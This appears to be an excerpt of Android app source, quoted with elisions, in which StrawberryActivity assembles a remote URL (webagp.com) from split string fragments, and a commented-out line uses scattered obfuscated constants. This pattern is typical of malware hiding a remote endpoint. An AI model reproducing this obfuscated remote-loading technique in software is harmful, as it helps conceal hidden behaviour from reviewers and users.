...
import static com.flowersyimg.app.PreferencesManagerImpl.SJSKCJ;

public class StrawberryActivity extends AppCompatActivity {

    public static final String DEP = "pls://run";
    ...
    protected void onCreate(Bundle savedInstanceState) {
        ...
        //https://webagp.com/tYds43rX
        //URL = s + zy + lll + sss + ksjskjc + ssajdla + sjjsjH + SJSKCJ + SJSALJAL + sjshhd + getString(R.string.sss);
        URL = "https://";
        URL = URL + "webagp.";
        URL = URL + "com/tYds43rX";
